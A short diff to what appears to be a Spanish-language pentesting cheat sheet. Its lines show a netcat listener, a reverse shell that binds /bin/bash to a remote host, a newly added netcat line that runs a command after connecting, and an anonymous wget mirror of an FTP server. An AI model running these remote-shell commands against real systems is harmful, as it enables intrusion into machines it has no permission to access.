@@ -15,6 +15,9 @@ Conectar programa a servidor en escucha y redireccionar salida por nc
     nc -lvvp [puerto]
     nc -v [ip] [puerto] -e /bin/bash
     
+Ejecutar comando tras conectar nc
+	nc IP PUERTO -c COMANDO (lo ejecuta /bin/sh)
+
 Descargar todo de ftp
 	wget -m --no-passive ftp://anonymous:anonymous@IP
 
